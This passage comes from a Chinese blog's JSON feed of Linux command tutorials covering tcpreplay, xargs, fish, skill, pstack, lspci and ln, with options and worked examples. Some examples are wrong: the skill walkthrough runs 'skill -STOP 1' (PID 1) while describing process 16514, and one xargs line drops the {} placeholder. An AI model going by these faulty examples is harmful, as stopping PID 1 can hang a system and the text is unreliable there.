0/8、172/8、 255/8。 -n 在使用-S 参数，不对混杂模式进行侦听。 -N &lt;CIDR1:CIDR2,...&gt; 通过伪造的 NAT，重写 IP 地址。这个参数应该有很重要的应用，目前没有测试使用。 -O 没有测试使用。 -p &lt;packetrate&gt; 指定每秒发送报文的个数，指定该参数，其它速率相关的参数被忽略，最后的打印信息不会有速率和每秒发送报文的统计。 -P 表示在输出信息中打印 PID 的信息，用于单用户或单帐户模式下暂停和重启程序。 -r &lt;rate&gt; 指定发送的速率。目前-m/-r/-p 这 3 个参数的相互关系。 -R 让网卡极限速度发数据包。 -t &lt;mtu&gt; 指定 MTU，标准的 10/100M 网卡的默认值是 1500。 -T Truncate packets &gt; 截去报文中 MTU 大于标准值的部分再发送出去，默认是不发送，skip 掉。 -v 每发送一个报文都以 tcpdump 的风格打印出对应的信息。 -V 查看版本号。 -w &lt;file&gt; 将主网卡发送的报文写入一个文件中，参数后紧跟文件名。 实例 *1、重放在客户端 ftp 连接的报文 * a、在客户端使用 ethereal 抓包，存为 ftp.pcap 文件。 b、 将 ftp.pcap 文件进行 tcpprep 操作，制作 cache 文件。 [root@A ~]# tcpprep -an client -i ftp.pcap -o ftp.cache –v c、 将 DUT 设备的两个接口和 PC 的两个接口使用网线连接，使用 tcpreplay 重 放报文。注意防火墙的配置为网桥（透明）模式。 [root@A ~]# tcpreplay -c ftp.cache -i eth0 -j eth1 ftp.pcap -R –v -R 参数表示全速发送，-v 显示打印信息。 *2、重放在客户端 BT 连接的报文 * a、在实验室 BT 下载一些台湾的娱乐节目和热门的大片，使用 ethereal 抓包， 存为 bt.pcap 文件。注意 pcap 文件大小的控制，对 pc 的内存要求比较高，我保 存了一个 600 多 M 的 pcap 文件用了 40 多分钟，大家有需要可以直接从实验室 copy。 b、将 bt.pcap 文件进行 tcpprep 操作，制作 cache 文件。 [root@A ~]# tcpprep -an client -i bt.pcap -o bt.cache -C &quot;100M BT Packet&quot; –v 制作 cache 文件，在 cache 文件中写入“100M BT Packet”的注释。 c、使用 tcpreplay 重放报文。 [root@A ~]# tcpreplay -c bt.cache -i eth0 -j eth1 bt.pcap -v –R *3、重放 tftp 服务器上抓到的报文 * a、在 tftp 服务器上使用 ethereal 抓包，存为 tftp.pcap 文件。 b、将 pcap 文件进行 tcpprep 的操作，制作 cache 文件。 [root@A ~]# tcpprep -an server -i tftp.pcap -o tftp.cache –v 注意：我在测试的时候犯了一个错误，使用 DUT 的 tftp 升级来做实验，同时穿 过 DUT 重放报文，结果在网卡发送报文的后，DUT 的 mac 地址做了的回应，导致 交互过程没有穿过 DUT，这个问题比较搞笑，上午弄了半天才发现原因，开始还 以为 udp 的连接不能重放。 c、使用 tcpreplay 重放报文。 [root@A ~]# tcpreplay -c tftp.cache -i eth0 -j eth1 tftp.pcap –v ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"tcpreplay","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/tcpreplay/","stats":{"text":"7 min read","time":363000,"words":1552,"minutes":7},"date":"2022-02-02 16:36:30","dateFormat":"2022-02-02"},{"content":"给其他命令传递参数的一个过滤器。 补充说明 xargs 命令是给其他命令传递参数的一个过滤器，也是组合多个命令的一个工具。它擅长将标准输入数据转换成命令行参数，xargs 能够处理管道或者 stdin 并将其转换成特定命令的命令参数。xargs 也可以将单行或多行文本输入转换为其他格式，例如多行变单行，单行变多行。xargs 的默认命令是 echo，空格是默认定界符。这意味着通过管道传递给 xargs 的输入将会包含换行和空白，不过通过 xargs 的处理，换行和空白将被空格取代。xargs 是构建单行命令的重要组件之一。 xargs 命令用法 xargs 用作替换工具，读取输入数据重新格式化后输出。 定义一个测试文件，内有多行文本数据： cat test.txt a b c d e f g h i j k l m n o p q r s t u v w x y z 多行输入单行输出： cat test.txt | xargs a b c d e f g h i j k l m n o p q r s t u v w x y z 使用 -n 进行多行输出 -n 选项 多行输出： cat test.txt | xargs -n3 a b c d e f g h i j k l m n o p q r s t u v w x y z 使用 -d 分割输入 -d 选项 可以自定义一个定界符： echo &quot;nameXnameXnameXname&quot; | xargs -dX name name name name 结合 -n 选项 使用： echo &quot;nameXnameXnameXname&quot; | xargs -dX -n2 name name name name 读取 stdin 读取 stdin，将格式化后的参数传递给命令 假设一个命令为 sk.sh 和一个保存参数的文件 arg.txt： #!/bin/bash #sk.sh 命令内容，打印出所有参数。 echo $* arg.txt 文件内容： cat arg.txt aaa bbb ccc 结合 -I 选项 xargs 的一个 选项 -I ，使用 -I 指定一个替换字符串 {}，这个字符串在 xargs 扩展时会被替换掉，当 -I 与 xargs 结合使用，每一个参数命令都会被执行一次： cat arg.txt | xargs -I {} ./sk.sh -p {} -l -p aaa -l -p bbb -l -p ccc -l 复制所有图片文件到 /data/images 目录下： ls *.jpg | xargs -n1 -I cp {} /data/images 结合 find 命令使用 xargs 结合 find 使用 用 rm 删除太多的文件时候，可能得到一个错误信息：/bin/rm Argument list too long. 用 xargs 去避免这个问题： find . -type f -name &quot;*.log&quot; -print0 | xargs -0 rm -f xargs -0 将 \\0 作为定界符。 统计一个源代码目录中所有 php 文件的行数： find . -type f -name &quot;*.php&quot; -print0 | xargs -0 wc -l 查找所有的 jpg 文件，并且压缩它们： find . -type f -name &quot;*.jpg&quot; -print | xargs tar -czvf images.tar.gz 打印出执行的命令 结合 -t 选项可以打印出 xargs 执行的命令 ls | xargs -t -I{} echo {} 会输出当前目录下的文件列表和执行的 echo 命令 使用 -p 选项确认执行的命令 -p 选项会在执行每一个命令时弹出确认，当你需要非常准确的确认每一次操作时可以使用 -p 参数，比如，查找当前目录下 .log 文件，每一次删除都需要确认： find . -maxdepth 1 -name &quot;*.log&quot; | xargs -p -I{} rm {} 执行多个命令 使用 -I 选项可以让 xargs 执行多个命令 cat foo.txt one two three cat foo.txt | xargs -I % sh -c 'echo %; mkdir %' one two three ls one two three 其他应用 xargs 其他应用 假如你有一个文件包含了很多你希望下载的 URL，你能够使用 xargs 下载所有链接： cat url-list.txt | xargs wget -c 子 Shell（Subshells） 运行一个 shell 脚本时会启动另一个命令解释器.，就好像你的命令是在命令行提示下被解释的一样，类似于批处理文件里的一系列命令。每个 shell 脚本有效地运行在父 shell(parent shell) 的一个子进程里。这个父 shell 是指在一个控制终端或在一个 xterm 窗口中给你命令指示符的进程。 cmd1 | ( cmd2; cmd3; cmd4 ) | cmd5 如果 cmd2 是 cd /，那么就会改变子 Shell 的工作目录，这种改变只是局限于子 shell 内部，cmd5 则完全不知道工作目录发生的变化。子 shell 是嵌在圆括号 () 内部的命令序列，子 Shell 内部定义的变量为局部变量。 子 shell 可用于为一组命令设定临时的环境变量： COMMAND1 COMMAND2 COMMAND3 ( IFS=: PATH=/bin unset TERMINFO set -C shift 5 COMMAND4 COMMAND5 exit 3 # 只是从子 shell 退出。 ) # 父 shell 不受影响，变量值没有更改。 COMMAND6 COMMAND7 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"xargs","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/xargs/","stats":{"text":"5 min read","time":293000,"words":1177,"minutes":5},"date":"2022-02-02 16:35:04","dateFormat":"2022-02-02"},{"content":"比 bash 更好用的 shell。 安装 # Ubuntu 和 Debian 的安装方法。 sudo apt-get install fish # Mac 的安装方法。 brew install fish 启动与帮助 由于 Fish 的语法与 Bash 有很大差异，Bash 脚本一般不兼容。因此，建议不要将 Fish 设为默认 Shell，而是每次手动启动它。 # 安装完成后，就可以启动 Fish。 $ fish # 使用过程中，如果需要帮助，可以输入 help 命令 $ help 彩色显示 # 无效命令为红色 $ mkd # 有效命令为蓝色 $ mkdir # 有效路径会有下划线。如果没有下划线，你就知道这个路径不存在。 $ cat ~/somefi 自动建议 Fish 会自动在光标后面给出建议，表示可能的选项，颜色为灰色。如果采纳建议，可以按下 → 或 Control + F 。如果只采纳一部分，可以按下 Alt + →。 $ /bin/hostname # 命令建议 $ grep --ignore-case 参数建议 $ ls node_modules # 路径建议 自动补全 输入命令时，Fish 会自动显示匹配的上一条历史记录。如果没有匹配的历史记录，Fish 会猜测可能的结果，自动补全各种输入。比如，输入 pyt 再按下 Tab ，就会自动补全为 python 命令。 Fish 还可以自动补全 Git 分支。 脚本语法 if 语句 if grep fish /etc/shells echo Found fish else if grep bash /etc/shells echo Found bash else echo Got nothing end switch 语句 switch (uname) case Linux echo Hi Tux! case Darwin echo Hi Hexley! case FreeBSD NetBSD DragonFly echo Hi Beastie! case '*' echo Hi, stranger! end while 循环 while true echo &quot;Loop forever&quot; end for 循环 for file in *.txt cp $file $file.bak end 函数 Fish 的函数用来封装命令，或者为现有的命令起别名。 function ll ls -lhG $argv end 上面代码定义了一个 ll 函数。命令行执行这个函数以后，就可以用 ll 命令替代 ls -lhG。其中，变量 $argv 表示函数的参数。 function ls command ls -hG $argv end 上面的代码重新定义 ls 命令。注意，函数体内的 ls 之前，要加上 command，否则会因为无限循环而报错。 提示符 fish_prompt 函数用于定义命令行提示符（prompt）。 function fish_prompt set_color purple date &quot;+%m/%d/%y&quot; set_color FF0 echo (pwd) '&gt;' set_color normal end 执行上面的函数以后，你的命令行提示符就会变成下面这样。 02/06/13 /home/tutorial &gt; 配置 Fish 的配置文件是 ~/.config/fish/config.fish，每次 Fish 启动，就会自动加载这个文件。Fish 还提供 Web 界面配置该文件。 $ fish_config # 浏览器打开 Web 界面配置 Running Commands: 兼容 bash 等 shell 的命令执行方式 Getting Help: help/man cmd -&gt; browser/terminal Syntax Highlighting: 实时检查命令是否正确 Wildcards: 支持缩写 * 递归 匹配 Pipes and Redirections: 使用 ^ 代表 stderr Autosuggestions: 自动建议, 可以使用 Ctrl-f / -&gt; 来补全 Tab Completions: 更强大的 tab 补全 Variables: 使用 set 设置 Exit Status: 使用 echo $status 替代 $? Exports (Shell Variables) Lists: all variables in fish are really lists Command Substitutions: 使用 (cmd) 来执行命令, 而不是 反引号、$() Combiners (And, Or, Not): 不支持使用符合来表示逻辑运算 Functions：使用 $argv 替代 $1 Conditionals (If, Else, Switch) / Functions / Loops: 更人性化的写法 (参考 py) Prompt: function fish_prompt 实现 Startup (Where's .bashrc?): ~/.config/fish/config.fish，更好的方式是 autoloading-function、universal-variables Autoloading Functions: ~/.config/fish/functions/. Universal Variables：a variable whose value is shared across all instances of fish set name 'czl' # 设置变量，替代 name=czl echo $name echo $status # exit status，替代 $? env # 环境变量 set -x MyVariable SomeValue # 替代 export set -e MyVariable set PATH $PATH /usr/local/bin # 使用 lists 记录 PATH set -U fish_user_paths /usr/local/bin $fish_user_paths # 永久生效 touch &quot;testing_&quot;(date +%s)&quot;.txt&quot; # command subtitution，替代 `date +%s` cp file.txt file.txt.bak; and echo 'back success'; or echo 'back fail' # combiner functions # 列出 fish 下定义的函数 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"fishshell","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/fishshell/","stats":{"text":"5 min read","time":242000,"words":927,"minutes":5},"date":"2022-02-02 16:33:47","dateFormat":"2022-02-02"},{"content":"向选定的进程发送信号冻结进程。 补充说明 skill 命令用于向选定的进程发送信号，冻结进程。这个命令初学者并不常用，深入之后牵涉到系统服务优化之后可能会用到。 语法 skill (选项) 选项 -f：快速模式； -i：交互模式，每一步操作都需要确认； -v：冗余模式； -w：激活模式； -V：显示版本号； -t：指定开启进程的终端号； -u：指定开启进程的用户； -p：指定进程的 id 号； -c：指定开启进程的指令名称。 实例 如果您发现了一个占用大量 CPU 和内存的进程，但又不想停止它，该怎么办？考虑下面的 top 命令输出： top -c -p 16514 23:00:44 up 12 days, 2:04, 4 users, load average: 0.47, 0.35, 0.31 1 processes: 1 sleeping, 0 running, 0 zombie, 0 stopped CPU states: cpu user nice system irq softirq iowait idle total 0.0% 0.6% 8.7% 2.2% 0.0% 88.3% 0.0% Mem: 1026912k av, 1010476k used, 16436k free, 0k shrd, 52128k buff 766724k actv, 143128k in_d, 14264k in_c Swap: 2041192k av, 83160k used, 1958032k free 799432k cached PID USER PRI NI SIZE RSS SHARE stat %CPU %MEM time CPU command 16514 oracle 19 4 28796 26M 20252 D N 7.0 2.5 0:03 0 oraclePRODB2... 既然您确认进程 16514 占用了大量内存，您就可以使用 skill 命令“冻结”它，而不是停止它。 skill -STOP 1 之后，检查 top 输出： 23:01:11 up 12 days, 2:05, 4 users, load average: 1.20, 0.54, 0.38 1 processes: 0 sleeping, 0 running, 0 zombie, 1 stopped CPU states: cpu user nice system irq softirq iowait idle total 2.3% 0.0% 0.3% 0.0% 0.0% 2.3% 94.8% Mem: 1026912k av, 1008756k used, 18156k free, 0k shrd, 3976k buff 770024k actv, 143496k in_d, 12876k in_c Swap: 2041192k av, 83152k used, 1958040k free 851200k cached PID USER PRI NI SIZE RSS SHARE STAT %CPU %MEM TIME CPU COMMAND 16514 oracle 19 4 28796 26M 20252 T N 0.0 2.5 0:04 0 oraclePRODB2... 现在，CPU 从 0% 空闲变为 94% 空闲。该进程被有效冻结。过一段时间之后，您可能希望唤醒该进程： skill -CONT 16514 如果希望暂时冻结进程以便为完成更重要的进程腾出空间，该方法非常有用。 此命令用途很广。如果您要停止 &quot;oracle&quot; 用户的所有进程，只需要一个命令即可实现： skill -STOP oracle 可以使用用户、PID、命令或终端 id 作为参数。以下命令可停止所有 rman 命令。 skill -STOP rman 如您所见，skill 决定您输入的参数（进程 ID、用户 ID 或命令）并进行相应操作。这可能会导致在某些情况下出现这样的问题：您可能具有同名的用户和命令。最好的示例是 &quot;oracle&quot; 进程，通常由用户 &quot;oracle&quot; 运行。因此，当您希望停止名为 &quot;oracle&quot; 的进程时，可执行以下命令： skill -STOP oracle 用户 &quot;oracle&quot; 的所有进程都停止，包括您可能要使用的会话。要非常明确地执行命令，您可以选择使用一个新参数指定参数的类型。要停止一个名为 oracle 的命令，可执行以下命令： skill -STOP -c oracle snice 命令的功能与 skill 类似。但它用于降低进程的优先级，而不是停止进程。首先，检查 top 输出： PID USER PRI NI SIZE RSS SHARE STAT %CPU %MEM TIME CPU COMMAND 3 root 15 0 0 0 0 RW 0.0 0.0 0:00 0 kapmd 13680 oracle 15 0 11336 10M 8820 T 0.0 1.0 0:00 0 oracle 13683 oracle 15 0 9972 9608 7788 T 0.0 0.9 0:00 0 oracle 13686 oracle 15 0 9860 9496 7676 T 0.0 0.9 0:00 0 oracle 13689 oracle 15 0 10004 9640 7820 T 0.0 0.9 0:00 0 oracle 13695 oracle 15 0 9984 9620 7800 T 0.0 0.9 0:00 0 oracle 13698 oracle 15 0 10064 9700 7884 T 0.0 0.9 0:00 0 oracle 13701 oracle 15 0 22204 21M 16940 T 0.0 2.1 0:00 0 oracle 现在，将 &quot;oracle&quot; 进程的优先级降低四个点。注意，该值越高，优先级越低。 snice +4 -u oracle PID USER PRI NI SIZE RSS SHARE STAT %CPU %MEM TIME CPU COMMAND 16894 oracle 20 4 38904 32M 26248 D N 5.5 3.2 0:01 0 oracle 注意，NI 列（nice 值）现在是 4，优先级现在设置为 20，而不是 15。这对于降低优先级非常有帮助。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"skill","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/skill/","stats":{"text":"5 min read","time":293000,"words":1059,"minutes":5},"date":"2022-02-02 16:32:45","dateFormat":"2022-02-02"},{"content":"显示每个进程的栈跟踪。 补充说明 pstack 命令可显示每个进程的栈跟踪。pstack 命令必须由相应进程的属主或 root 运行。可以使用 pstack 来确定进程挂起的位置。此命令允许使用的唯一选项是要检查的进程的 PID。 命令软件包下载地址：https://packages.debian.org/sid/pstack 实例 pstree 以树结构显示进程 pstree -p work | grep ad sshd(22669)---bash(22670)---ad_preprocess(4551)-+-{ad_preprocess}(4552) |-{ad_preprocess}(4553) |-{ad_preprocess}(4554) |-{ad_preprocess}(4555) |-{ad_preprocess}(4556) `-{ad_preprocess}(4557) work 为工作用户，-p 为显示进程识别码，ad_preprocess 共启动了 6 个子线程，加上主线程共 7 个线程。 ps -Lf 4551 UID PID PPID LWP C NLWP STIME TTY stat time CMD work 4551 22670 4551 2 7 16:30 pts/2 Sl+ 0:02 ./ad_preprocess work 4551 22670 4552 0 7 16:30 pts/2 Sl+ 0:00 ./ad_preprocess work 4551 22670 4553 0 7 16:30 pts/2 Sl+ 0:00 ./ad_preprocess work 4551 22670 4554 0 7 16:30 pts/2 Sl+ 0:00 ./ad_preprocess work 4551 22670 4555 0 7 16:30 pts/2 Sl+ 0:00 ./ad_preprocess work 4551 22670 4556 0 7 16:30 pts/2 Sl+ 0:00 ./ad_preprocess work 4551 22670 4557 0 7 16:30 pts/2 Sl+ 0:00 ./ad_preprocess 进程共启动了 7 个线程 pstack 显示每个进程的栈跟踪： pstack 4551 Thread 7 (Thread 1084229984 (LWP 4552)): #0 0x000000302afc63dc in epoll_wait () from /lib64/tls/libc.so.6 #1 0x00000000006f0730 in ub::EPollEx::poll () #2 0x00000000006f172a in ub::NetReactor::callback () #3 0x00000000006fbbbb in ub::UBTask::CALLBACK () #4 0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0 #5 0x000000302afc6003 in clone () from /lib64/tls/libc.so.6 #6 0x0000000000000000 in ?? () Thread 6 (Thread 1094719840 (LWP 4553)): #0 0x000000302afc63dc in epoll_wait () from /lib64/tls/libc.so.6 #1 0x00000000006f0730 in ub::EPollEx::poll () #2 0x00000000006f172a in ub::NetReactor::callback () #3 0x00000000006fbbbb in ub::UBTask::CALLBACK () #4 0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0 #5 0x000000302afc6003 in clone () from /lib64/tls/libc.so.6 #6 0x0000000000000000 in ?? () Thread 5 (Thread 1105209696 (LWP 4554)): #0 0x000000302b80baa5 in __nanosleep_nocancel () #1 0x000000000079e758 in comcm::ms_sleep () #2 0x00000000006c8581 in ub::UbClientManager::healthyCheck () #3 0x00000000006c8471 in ub::UbClientManager::start_healthy_check () #4 0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0 #5 0x000000302afc6003 in clone () from /lib64/tls/libc.so.6 #6 0x0000000000000000 in ?? () Thread 4 (Thread 1115699552 (LWP 4555)): #0 0x000000302b80baa5 in __nanosleep_nocancel () #1 0x0000000000482b0e in armor::armor_check_thread () #2 0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0 #3 0x000000302afc6003 in clone () from /lib64/tls/libc.so.6 #4 0x0000000000000000 in ?? () Thread 3 (Thread 1126189408 (LWP 4556)): #0 0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6 #1 0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6 #2 0x000000000044c972 in Business_config_manager::run () #3 0x0000000000457b83 in Thread::run_thread () #4 0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0 #5 0x000000302afc6003 in clone () from /lib64/tls/libc.so.6 #6 0x0000000000000000 in ?? () Thread 2 (Thread 1136679264 (LWP 4557)): #0 0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6 #1 0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6 #2 0x00000000004524bb in Process_thread::sleep_period () #3 0x0000000000452641 in Process_thread::run () #4 0x0000000000457b83 in Thread::run_thread () #5 0x000000302b80610a in start_thread () from /lib64/tls/libpthread.so.0 #6 0x000000302afc6003 in clone () from /lib64/tls/libc.so.6 #7 0x0000000000000000 in ?? () Thread 1 (Thread 182894129792 (LWP 4551)): #0 0x000000302af8f1a5 in __nanosleep_nocancel () from /lib64/tls/libc.so.6 #1 0x000000302af8f010 in sleep () from /lib64/tls/libc.so.6 #2 0x0000000000420d79 in Ad_preprocess::run () #3 0x0000000000450ad0 in main () ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"pstack","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/pstack/","stats":{"text":"4 min read","time":222000,"words":660,"minutes":4},"date":"2022-02-02 16:31:51","dateFormat":"2022-02-02"},{"content":"显示当前主机的所有 PCI 总线信息。 补充说明 lspci 命令用于显示当前主机的所有 PCI 总线信息，以及所有已连接的 PCI 设备信息。 语法 lspci (选项) 选项 -n：以数字方式显示 PCI 厂商和设备代码； -t：以树状结构显示 PCI 设备的层次关系，包括所有的总线、桥、设备以及它们之间的联接； -b：以总线为中心的视图； -d：仅显示给定厂商和设备的信息； -s：仅显示指定总线、插槽上的设备和设备上的功能块信息； -i：指定 PCI 编号列表文件，而不使用默认的文件； -m：以机器可读方式显示 PCI 设备信息。 实例 [root@localhost ~]# lspci 00:00.0 host bridge: Intel Corporation 5500 I/O Hub to ESI Port (rev 22) 00:01.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 1 (rev 22) 00:02.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 2 (rev 22) 00:03.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 3 (rev 22) 00:07.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 7 (rev 22) 00:08.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 8 (rev 22) 00:09.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 9 (rev 22) 00:0a.0 PCI bridge: Intel Corporation 5520/5500/X58 I/O Hub PCI Express Root Port 10 (rev 22) 00:10.0 PIC: Intel Corporation 5520/5500/X58 Physical and Link Layer Registers Port 0 (rev 22) 00:10.1 PIC: Intel Corporation 5520/5500/X58 Routing and Protocol Layer Registers Port 0 (rev 22) 00:11.0 PIC: Intel Corporation 5520/5500 Physical and Link Layer Registers Port 1 (rev 22) 00:11.1 PIC: Intel Corporation 5520/5500 Routing &amp; Protocol Layer Register Port 1 (rev 22) 00:14.0 PIC: Intel Corporation 5520/5500/X58 I/O Hub System Management Registers (rev 22) 00:14.1 PIC: Intel Corporation 5520/5500/X58 I/O Hub GPIO and Scratch Pad Registers (rev 22) 00:14.2 PIC: Intel Corporation 5520/5500/X58 I/O Hub Control Status and RAS Registers (rev 22) 00:14.3 PIC: Intel Corporation 5520/5500/X58 I/O Hub Throttle Registers (rev 22) 00:16.0 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:16.1 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:16.2 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:16.3 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:16.4 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:16.5 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:16.6 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:16.7 System peripheral: Intel Corporation 5520/5500/X58 Chipset QuickData Technology Device (rev 22) 00:1a.0 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #4 00:1a.1 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #5 00:1a.7 USB controller: Intel Corporation 82801JI (ICH10 Family) USB2 EHCI Controller #2 00:1b.0 Audio device: Intel Corporation 82801JI (ICH10 Family) HD Audio Controller 00:1c.0 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 1 00:1c.4 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 5 00:1c.5 PCI bridge: Intel Corporation 82801JI (ICH10 Family) PCI Express Root Port 6 00:1d.0 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #1 00:1d.1 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #2 00:1d.2 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #3 00:1d.3 USB controller: Intel Corporation 82801JI (ICH10 Family) USB UHCI Controller #6 00:1d.7 USB controller: Intel Corporation 82801JI (ICH10 Family) USB2 EHCI Controller #1 00:1e.0 PCI bridge: Intel Corporation 82801 PCI Bridge (rev 90) 00:1f.0 ISA bridge: Intel Corporation 82801JIR (ICH10R) lpc Interface Controller 00:1f.2 IDE interface: Intel Corporation 82801JI (ICH10 Family) 4 port SATA IDE Controller #1 00:1f.3 SMBus: Intel Corporation 82801JI (ICH10 Family) SMBus Controller 00:1f.5 IDE interface: Intel Corporation 82801JI (ICH10 Family) 2 port SATA IDE Controller #2 01:01.0 VGA compatible controller: ASPEED Technology, Inc. ASPEED Graphics Family (rev 10) 02:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection 03:00.0 Ethernet controller: Intel Corporation 82574L Gigabit Network Connection 04:00.0 Serial Attached SCSI controller: LSI Logic / Symbios Logic SAS2008 PCI-Express Fusion-MPT SAS-2 [Falcon] (rev 03) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"lspci","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/lspci/","stats":{"text":"6 min read","time":311000,"words":914,"minutes":6},"date":"2022-02-02 16:26:41","dateFormat":"2022-02-02"},{"content":"用来为文件创建链接。 补充说明 ln 命令用来为文件创建链接，链接类型分为硬链接和符号链接两种，默认的链接类型是硬链接。如果要创建符号链接必须使用&quot;-s&quot;选项。 注意：符号链接文件不是一个独立的文件，它的许多属性依赖于源文件，所以给符号链接文件设置存取权限是没有意义的。 语法 ln [选项 ]... [-T] 目标 链接名 (第一种格式) 或：ln [选项 ]... 目标 (第二种格式) 或：ln [选项 ]... 目标... 目录 (第三种格式) 或：ln [选项 ]... -t 目录 目标... (第四种格式) 选项 --backup[=CONTROL] 为每个已存在的目标文件创建备份文件 -b 类似--backup，但不接受任何参数 -d, -F, --directory 创建指向目录的硬链接 (只适用于超级用户) -f, --force 强行删除任何已存在的目标文件 -i, --interactive 覆盖既有文件之前先询问用户； -L, --logical 取消引用作为符号链接的目标 -n, --no-dereference 把符号链接的目的目录视为一般文件； -P, --physical 直接将硬链接到符号链接 -r, --relative 创建相对于链接位置的符号链接 -s, --symbolic 对源文件建立符号链接，而非硬链接； -S, --suffix=SUFFIX 用&quot;-b&quot;参数备份目标文件后，备份文件的字尾会被加上一个备份字符串，预设的备份字符串是符号“~”，用户可通过“-S”参数来改变它； -t, --target-directory=DIRECTORY 指定要在其中创建链接的 DIRECTORY -T, --no-target-directory 将“LINK_NAME”视为常规文件 -v, --verbose 打印每个链接文件的名称 --help 显示此帮助信息并退出 --version 显示版本信息并退出 参数 源文件：指定链接的源文件。如果使用-s选项创建符号链接，则“源文件”可以是文件或者目录。创建硬链接时，则“源文件”参数只能是文件； 目标文件：指定源文件的目标链接文件。 none, off # 不进行备份 (即使使用了--backup 选项) numbered, t # 备份文件加上数字进行排序 existing, nil # 若有数字的备份文件已经存在则使用数字，否则使用普通方式备份 simple, never # 永远使用普通方式备份 实例 将目录/usr/mengqc/mub1下的文件 m2.c 链接到目录/usr/liu下的文件 a2.c cd /usr/mengqc ln /mub1/m2.c /usr/liu/a2.c 在执行 ln 命令之前，目录/usr/liu中不存在 a2.c 文件。执行 ln 之后，在/usr/liu目录中才有 a2.c 这一项，表明 m2.c 和 a2.c 链接起来（注意，二者在物理上是同一文件），利用ls -l命令可以看到链接数的变化。 在目录/usr/liu下建立一个符号链接文件 abc，使它指向目录/usr/mengqc/mub1 ln -s /usr/mengqc/mub1 /usr/liu/abc 执行该命令后，/usr/mengqc/mub1代表的路径将存放在名为/usr/liu/abc的文件中。 扩展知识 Linux 具有为一个文件起多个名字的功能，称为链接。被链接的文件可以存放在相同的目录下，但是必须有不同的文件名，而不用在硬盘上为同样的数据重复备份。另外，被链接的文件也可以有相同的文件名，但是存放在不同的目录下，这样只要对一个目录下的该文件进行修改，就可以完成对所有目录下同名链接文件的修改。对于某个文件的各链接文件，我们可以给它们指定不同的存取权限，以控制对信息的共享和增强安全性。 文件链接有两种形式，即硬链接和符号链接。 硬链接 建立硬链接时，在另外的目录或本目录中增加目标文件的一个目录项，这样，一个文件就登记在多个目录中。如图所示的 m2.c 文件就在目录 mub1 和 liu 中都建立了目录项。 创建硬链接后，己经存在的文件的 I 节点号（Inode）会被多个目录文件项使用。一个文件的硬链接数可以在目录的长列表格式的第二列中看到，无额外链接的文件的链接数为 l。 在默认情况下，ln 命令创建硬链接。ln 命令会增加链接数，rm 命令会减少链接数。一个文件除非链接数为 0，否则不会从文件系统中被物理地删除。 对硬链接有如下限制： 不能对目录文件做硬链接。 不能在不同的文件系统之间做硬链接。就是说，链接文件和被链接文件必须位于同一个文件系统中。 符号链接 符号链接也称为软链接，是将一个路径名链接到一个文件。这些文件是一种特别类型的文件。事实上，它只是一个文本文件（如图中的 abc 文件），其中包含它提供链接的另一个文件的路径名，如图中虚线箭头所示。另一个文件是实际包含所有数据的文件。所有读、写文件内容的命令被用于符号链接时，将沿着链接方向前进来访问实际的文件。 !符号连接 与硬链接不同的是，符号链接确实是一个新文件，当然它具有不同的 I 节点号；而硬链接并没有建立新文件。 符号链接没有硬链接的限制，可以对目录文件做符号链接，也可以在不同文件系统之间做符号链接。 用ln 